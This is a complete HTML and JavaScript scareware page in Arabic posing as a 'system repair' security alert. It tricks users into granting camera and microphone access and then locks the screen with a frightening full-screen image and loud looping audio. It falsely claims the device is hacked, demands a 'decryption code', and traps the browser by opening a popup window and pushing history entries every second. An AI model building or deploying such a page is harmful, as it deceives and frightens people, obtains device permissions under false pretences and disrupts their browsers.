<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ SYSTEM_REPAIR_DZ ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
        
        /* صورة المرأة اللي تغطي الشاشة سواسوة */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; width: 105vw; height: 105vh; 
            object-fit: cover; z-index: 1; display: none;
            filter: contrast(180%) brightness(40%);
            animation: stalkingGaze 6s infinite ease-in-out;
        }

        @keyframes stalkingGaze {
            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%); }
            50% { transform: scale(1.06) translate(-5%, -5%); }
        }

        /* نافذة الأذونات المزيفة سواسوة */
        #permissionBox {
            position: fixed; z-index: 100; background: #111; color: white;
            padding: 25px; border-radius: 15px; border: 1px solid #333;
            text-align: center; font-family: sans-serif; width: 85%;
            box-shadow: 0 0 50px rgba(0,0,0,1);
        }

        .btn-allow { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
        
        #deepWebOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.8); padding: 30px; border: 1px solid #900; display: none; width: 90%; }
        .blink-red { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.5; } }
    </style>
</head>
<body>

    <div id="permissionBox">
        <h3 style="margin-top:0;">⚠️ تنبيه أمني</h3>
        <p style="font-size: 14px; color: #ccc;">يتطلب "نظام الحماية" الوصول إلى الأذونات التالية لإصلاح أعطال المتصفح:</p>
        <ul style="text-align: right; font-size: 13px; color: #aaa;">
            <li>الوصول إلى الكاميرا (للمسح الحي)</li>
            <li>الوصول إلى الموقع (لتحديد الخادم)</li>
            <li>إذن العرض فوق التطبيقات الأخرى</li>
        </ul>
        <button class="btn-allow" onclick="requestFullAccess()">سماح بالكل (Allow All)</button>
    </div>

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="deepWebOverlay">
        <h1 class="blink-red">STALKER SYSTEM</h1>
        <p>تم اختراق النظام.. كل أذوناتك أصبحت لنا سواسوة.</p>
        <input type="text" style="background:#000; color:#f00; border:1px solid #f00; padding:10px; width:80%; text-align:center;" placeholder="أدخل كود فك التشفير">
    </div>

    <audio id="sfx" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>

    <script>
        async function requestFullAccess() {
            // 1. طلب الكاميرا والميكروفون حقيقة سواسوة
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
            } catch (e) { console.log("Permission Denied but we continue..."); }

            // 2. إخفاء النافذة وبدء الكابوس سواسوة
            document.getElementById('permissionBox').style.display = 'none';
            document.getElementById('stalkerEntity').style.display = 'block';
            document.getElementById('deepWebOverlay').style.display = 'block';

            // 3. تشغيل الصوت والـ Fullscreen سواسوة
            const audio = document.getElementById('sfx');
            audio.volume = 1.0;
            audio.play();
            document.documentElement.requestFullscreen();

            // 4. الحبس المؤبد سواسوة
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=10,height=10');
                history.pushState(null, null, window.location.href);
            }, 1000);
        }
    </script>
</body>
</html>
